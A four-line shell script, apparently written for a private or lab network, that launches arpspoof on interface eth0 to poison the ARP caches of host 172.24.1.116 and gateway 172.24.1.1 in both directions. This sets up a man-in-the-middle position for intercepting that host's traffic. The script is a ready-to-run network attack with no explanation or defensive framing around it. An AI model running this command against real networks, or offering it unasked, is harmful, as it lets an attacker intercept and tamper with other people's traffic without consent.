#!/bin/sh

arpspoof \
-i eth0 \
-t 172.24.1.116 \
-r 172.24.1.1
